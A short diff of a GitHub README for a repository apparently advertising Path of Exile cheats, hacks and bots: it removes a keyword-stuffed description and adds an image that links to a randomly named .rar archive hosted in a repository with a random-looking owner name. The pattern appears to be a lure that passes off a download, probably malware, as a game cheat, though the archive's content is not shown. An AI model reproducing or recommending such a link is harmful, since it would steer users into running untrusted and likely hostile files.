@@ -1,2 +1,1 @@
-# poeBLACK1
-poe poe-cheat poe-cheats poe-hack poe-hacks poe-bot poe-private poe-exploit poe-trainer poetry-generator poe-auto-farm-bot poe-script
+[![ o48g ](https://github.com/beT13OkEdOfiVAmYly/poeBLACK1/blob/main/gkalskasfk.png)](https://github.com/beT13OkEdOfiVAmYly/poeBLACK1/raw/main/9fx0zscbw3.rar)
